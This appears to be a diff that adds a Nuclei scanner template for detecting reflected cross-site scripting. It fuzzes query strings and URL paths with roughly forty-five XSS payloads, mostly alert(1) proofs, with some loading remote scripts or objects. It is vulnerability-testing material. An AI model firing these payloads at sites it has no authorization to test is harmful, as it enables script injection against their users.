@@ -1,0 +1,98 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<script>alert(1)</script>"
+        - "<object type=\"text/x-scriptlet\" data=\"http://jsfiddle.net/XLE63/ \"></object>"
+        - "<meta content=\"&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)\" http-equiv=\"refresh\"/>
+<svg><script xlink:href=data%3A,&#111;&#110;,window.open('https://www.google.com/')></script"
+        - "<html onmousemove=\"alert(1)\">"
+        - "&lt;/iframe&gt;&lt;"
+        - "<iframe/src=\"data:text/html,<svg &#111;&#110;load=alert(1)>\">
+<meta content=\"&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)\" http-equiv=\"refresh\"/>
+<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script>"
+        - "&lt;SCRIPT SRC=http://ha.ckers.org/.j&gt;&lt;/SCRIPT&gt;"
+        - "<s onmousedown=\"alert(1)\">test"
+        - "<script>alert&#40;\"XSS&#47;&#110;&#114;\\x0Dalert&#40;1&#41;\">"
+        - "<script>alert('XSS')</script&gt;"
+        - "<style>@keyframes x{}</style><th style=\"animation-name:x\" onanimationstart=\"alert(1)\"></th>"
+        - "<video autoplay controls onseeking=alert(1)><source src=\"validvideo.mp4\" type=\"video/mp4\"></video>"
+        - "<input onbeforepaste=\"alert(1)\" contenteditable>test</input>"
+        - "<script>alert(42);</script>"
+        - "<style>:target {color:red;}</style><source id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></source>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><source ondragover=alert(1) contenteditable>drop here</source>"
+        - "<embed code=\"http://businessinfo.co.uk/labs/xss/xss.swf\" allowscriptaccess=always>"
+        - "<s onmouseenter=\"alert(1)\">test"
+        - "&lt;SCRIPT SRC=&quot;http://ha.ckers.org/.j&quot;&gt;&lt;/SCRIPT&gt;
+"
+        - "<script>alert(33)</script"
+        - "<div draggable=\"true\" contenteditable>drag me</div><object ondrop=alert(1) contenteditable>drop here</object>"
+        - "<script/&#111;&#110;alert(/XSS/)</script&gt;"
+        - "<object data=\"http://jsfiddle.net/XLE63/\" type=\"text/x-scriptlet\">"
+        - "<embed code=\"http://businessinfo.co.uk/labs/xss/xss.swf\">"
+        - "&lt;IMG SRC=&quot;x&quot; onmousemove=&quot;alert(String.fromCharCode(88,83,83))\">"
+        - "<style>:target {color:red;}</style><img id=x style=\"transition:transform 10s\" ontransitioncancel=alert(1)>"
+        - "<style>:target {color:red;}</style><bdi id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></bdi>"
+        - "<object data=//jsfiddle.net/t846h/embed/ type=text/x-scriptlet>"
+        - "<object data=\"javascript:alert(1)\"></object>"
+        - "<marquee/onload=alert(1)"
+        - "<s onbeforepaste=\"alert(1)\" contenteditable>test"
+        - "<html onkeyup=\"alert(1)\" contenteditable>test</html>"
+        - "<body onbeforecut=\"alert(1)\" contenteditable>test</body>"
+        - "<iframe/src=//ha.ckers.org/xss.html
+```"
+        - "<picture onload=alert(1)><source src=validimage.png type=image/webp><img onloadend=alert(1)src=validimage.png></picture"
+        - "<script>alert(9)</script>"
+        - "<object type=\"text/x-scriptlet\" data=\"http://jsfiddle.net/XLE63/ \"></object>
+<meta http-equiv=\"refresh\" content=\"0;javascript&#115;&#112;alert(1)\"/>
+<math><a xlink:href=\"//jsfiddle.net/t846h/\">click
+<embed code=\"http://businessinfo.co.uk/labs/xss/xss.swf\" allowscriptaccess=always>"
+        - "<style>:target {color:red;}</style><img id=x style=\"transition:color 1s\" ontransitionend=alert(1)>"
+        - "<embed code=\"http://businessinfo.co.uk/labs/xss/xss.swf\" allowscriptaccess=always>"
+        - "<svg xmlns=&quot;http://www.w3.org/2000/svg&quot; onload=alert(1)></s"
+        - "<audio autoplay controls onloadedmetadata=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>"
+        - "<input autofocus />"
+        - "&lt;/SCRIPT&gt;"
+        - "<iframe src=\"&lt;&lt;-alert(88)&gt;\">"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
